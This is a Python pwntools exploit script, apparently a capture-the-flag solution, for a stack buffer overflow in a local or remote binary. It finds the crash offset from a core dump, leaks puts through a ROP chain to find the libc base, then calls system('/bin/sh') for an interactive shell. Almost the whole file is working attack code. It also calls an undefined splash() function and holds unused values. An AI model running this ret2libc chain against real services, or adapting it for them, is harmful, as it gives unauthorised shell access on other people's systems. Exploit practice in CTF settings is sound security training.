from pwn import *
import sys

argv = sys.argv

DEBUG = False
BINARY = argv[1]
elf = ELF(BINARY)
libc = ELF("libc.so.6")
FLAG_ADDR = 0x10a38c 


context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def getAutoPayload():
	# Generate a cyclic pattern so that we can auto-find the offset
	payload = cyclic(256)

	# Run the process once so that it crashes
	autoproc = process(BINARY)
	autoproc.sendline(payload)
	autoproc.wait()

	# Get the core dump
	core = Coredump('./core')

	# Our cyclic pattern should have been used as the crashing address
	assert pack(core.fault_addr) in payload

	# Cool! Now let's just replace that value with the address needed
	faultloc = cyclic_find(pack(core.fault_addr))

	print(faultloc)
	payload = b"a" * faultloc
	return payload

def connect():
    if len(argv) < 3:
    	stdout = process.PTY
    	stdin = process.PTY

    	sh = process(BINARY, stdout=stdout, stdin=stdin)

    	if DEBUG:
    		attach_gdb()

    	REMOTE = False
    else:
    	NC = sys.argv[2]
    	ip = NC.split(":")[0]
    	port = int(NC.split(":")[1])
    	sh = remote(ip, port)
    	REMOTE = True
    return sh

pop_rdi = 0x400733
pop_rsi_r15 = 0x400731

# Cool!
splash()

# Connect to local/remote process
sh = connect()

# Generate auto payload
autopayload = getAutoPayload()

# First pass (leak libc)
print("1st pass...")
payload = autopayload + p64(pop_rdi)

payload += p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(elf.symbols["main"])

# Send payload
sh.sendline(payload)

# Parse leak
leak = sh.recvline_startswith("\xc0")
leak = int.from_bytes(leak, byteorder="little")
libcbase = leak - libc.symbols["puts"]
print("LEAKED LIBC BASE ADDR: " + hex(libcbase))

# 2nd pass...
print("2nd pass...")
syscall = libcbase + libc.symbols["system"]
binsh = libcbase + 0x1b3e9a
payload2 = autopayload + p64(0x400506) + p64(pop_rdi)

payload2 += p64(binsh) + p64(syscall)

# Send payload
sh.sendline(payload2)

# Open shell
sh.interactive()